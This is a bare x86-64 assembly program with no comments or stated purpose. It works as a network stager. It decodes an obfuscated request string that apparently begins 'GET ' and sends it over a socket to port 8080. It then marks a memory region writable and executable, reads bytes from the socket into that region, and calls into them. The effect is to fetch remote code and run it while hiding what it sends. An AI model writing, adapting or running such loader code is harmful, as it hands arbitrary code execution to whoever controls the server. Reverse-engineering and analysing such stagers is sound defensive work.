	.section .data

req:
	.int 0x26617050,0x61a026d6,0x37d62161,0x84f437c6,0x6313d2a0
	.int 0xd2e22687,0xa2e23212,0x876313d2,0x27a727a7,0x84f484f4

	.section .text

	.globl _start

_start:
	addq	$0xffffffffffffffd0,%rsp
	xorl	%ecx,%ecx
	jmp		.L0
.L1:
	leaq	req,%r8
	addq	%rcx,%r8
	movb	(%r8),%r9b
	movb	%r9b,%r10b
	shlb	$4,%r10b
	shrb	$4,%r9b
	orb		%r10b,%r9b
	xorb	$0x42,%r9b
	movb	%r9b,(%r8)
	addl	$1,%ecx
.L0:
	cmpl	$0x28,%ecx
	jl		.L1
	movl	$0x29,%eax
	movl	$0x2,%edi
	movl	$0x1,%esi
	xorl	%edx,%edx
	syscall
	test	%eax,%eax
	je		.L2
	movl	%eax,0x28(%rsp)
	xorq	%rax,%rax
	movq	%rax,0x10(%rsp)
	movq	%rax,0x18(%rsp)
	movw	$0x2,0x10(%rsp)
	movw	$0x901f,0x12(%rsp)
	movl	$0x2a,%eax
	movl	0x28(%rsp),%edi
	leaq	0x10(%rsp),%rsi
	movl	$0x10,%edx
	syscall
	cmpl	$0xffffffff,%eax
	je		.L3
	movl	$0x2c,%eax
	movl	0x28(%rsp),%edi
	leaq	req,%rsi
	movl	$0x28,%edx
	xorl	%r10d,%r10d
	leaq	0x10(%rsp),%r8
	movl	$0x10,%r9d
	syscall
	cmpl	$0x28,%eax
	jne		.L3
	movl	$0xa,%eax
	movl	$0x401000,%edi
	movl	$0x1000,%esi
	movl	$0x7,%edx
	syscall
	movl	$0x7d,0x8(%rsp)
	movq	$0x401a00,(%rsp)
.L4:
	movl	$0x2d,%eax
	movl	0x28(%rsp),%edi
	movq	(%rsp),%rsi
	movl	0x8(%rsp),%edx
	xorl	%r10d,%r10d
	xorl	%r8d,%r8d
	xorl	%r9d,%r9d
	syscall
	addl	%eax,(%rsp)
	subl	%eax,0x8(%rsp)
	test	%eax,%eax
	jle 	.L3
	cmpl	$0,0x8(%rsp)
	jg		.L4
.L3:
	movl	$0x3,%eax
	movl	0x28(%rsp),%edi
	syscall
	movl	$0x401a4c,%eax
	call	*%rax
.L2:
	xorl	%edi,%edi
	addq	$0x30,%rsp
	popq	%rsp
	movl	$0x3c,%eax
	syscall
